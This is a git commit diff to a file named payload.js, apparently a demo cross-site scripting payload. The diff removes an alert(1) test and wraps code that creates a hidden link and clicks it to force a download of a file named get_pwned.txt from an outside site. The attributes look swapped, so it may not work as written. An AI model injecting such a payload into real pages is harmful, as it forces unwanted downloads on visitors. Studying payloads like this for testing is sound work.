dfc5a081c35053e187e6c7c8525cc7432e472dd3
sushio4 <101455723+sushio4@users.noreply.github.com>
2024-04-09 13:47:51 +0200

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,11 +1,13 @@
-alert(1)
-const element = document.createElement('a');
-element.setAttribute('href', 'Download Btn');
-element.setAttribute('download', 'https://sushio4.github.io/txts/get_pwned.txt');
+const downloadFile = (file) => {
+  const element = document.createElement('a');
+  element.setAttribute('href', 'Download Btn');
+  element.setAttribute('download', file);
 
-element.style.display = 'none';
+  element.style.display = 'none';
 
-document.body.appendChild(element);
+  document.body.appendChild(element);
 
-element.click();
-document.body.removeChild(element);
+  element.click();
+  document.body.removeChild(element);
+}
+downloadFile('https://sushio4.github.io/txts/get_pwned.txt');
